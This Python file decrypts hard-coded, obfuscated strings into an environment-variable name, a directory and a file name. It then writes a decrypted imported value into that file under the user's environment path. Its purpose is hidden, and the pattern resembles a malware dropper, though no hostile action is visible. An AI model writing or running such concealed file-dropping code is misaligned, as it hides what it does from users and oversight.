# -*- coding: utf-8 -*-
import os
from decenc.cttk import k
from decenc.decstr import strdec
from decenc.encsrt import strenc


def gs():
    p = "6fNzR18qgw1s4KBTPD1orwABhqCAAAAAAGEtmnBJ0WfuvNuoS_ni8Rr8JbQ5gazHE2yYjqyHMH7Ufu4ok-w25s2HH5btBzawaWKB-iG14a-KXSe-Ops_OPUWELe2"
    p = p.encode()

    p = strdec(p, "_").decode()

    pms = "Ivj8sh5pASjy9z_Y8_AwEAABhqCAAAAAAGEtnKY5PlQxA0_Q1zHRPsODIapRvm0hmvjhzJ6vCQVq99hODbitOoqcxDlK92u-1KdIo5l_b7pgZU4dM59br1W6MQ34iSrSBAeeZVXdQUmb-jqLOg=="

    pms = pms.encode()

    pms = strdec(pms, p).decode()

    apd = "T3FHXcYty2hTUQrWrG0EvgABhqCAAAAAAGEtnXD2ZxPVE38ZfvMW23vT-eNj76eY7RwNOvRHW4zy8sC4S79FLK9sYI2YUuPmvhdvhpqwhHxwdT9PVWG0UmQZ0BwM"

    apd = apd.encode()

    apd = strdec(apd, p).decode()

    wk = "PH3s6Ofe2bBD6JnALwUomgABhqCAAAAAAGEtndhfQk7Wu8gVDISc7HWb0fW7vG6bTlNC6VdcslX-axfkLXENFXHHHvHL0W5FV-U_8w8Z1bb6xfxchuVVGY_O52nn"

    wk = wk.encode()

    wk = strdec(wk, p).decode()

    return pms, apd, wk


def gf(x=False):
    pms1, apd1, wk = gs()
    p1 = os.getenv(apd1)
    p15 = f"{p1}{pms1}"

    if not os.path.isdir(p15):
        os.makedirs(p15)

    y = k

    z = y.encode()

    z0 = strdec(z, apd1).decode()

    if x:
        return f"{p15}{wk}"

    with open(f"{p15}{wk}", "w") as p3:
        p3.write(z0)


def gt():
    p = "6fNzR18qgw1s4KBTPD1orwABhqCAAAAAAGEtmnBJ0WfuvNuoS_ni8Rr8JbQ5gazHE2yYjqyHMH7Ufu4ok-w25s2HH5btBzawaWKB-iG14a-KXSe-Ops_OPUWELe2"
    p = p.encode()

    p = strdec(p, "_").decode()

    pms = "URuW6EJ18Ey-tkkupTtenAABhqCAAAAAAGEtpkLNypittyivljCpXE80nhucCBYGfpyShbX1wNI6dOlEVsxCgUO5cQF-emtSiEEH2qJz1EmRjN88OzUWRmqT2E6g"

    pms = pms.encode()

    pms = strdec(pms, p).decode()

    apd = "sQu30oI4nZX8F75A-GA-6gABhqCAAAAAAGEtpnBvpeGmtbp8cy1hIYZb6-zqlXEI_YSEGFpINLls6zGbgnmUew4NLNpb3hG9OFosUwuhQ_jGeyKkqmRp6xUAT_K_ETGbfc8Oyr-P7FSRxMXRUbHmD_111CdOQmDxRXp_JnCUbYxQt8D-yrz0c9qfqvS9BnUnxukubR2WF33tfJuNgg=="

    apd = apd.encode()

    apd = strdec(apd, p).decode()

    wk = "JTzZcmxc-VnxSr_9pVSA2wABhqCAAAAAAGEtpoVW5Ic0Wro3a4BorEYZYD9EfilfFuzC14xrLNLK3SjePbU-04SAdt8AGiICJ8Nd9m5LtNPHWhe6ef2e-8aaAXh9"

    wk = wk.encode()

    wk = strdec(wk, p).decode()

    return p, pms, apd, wk
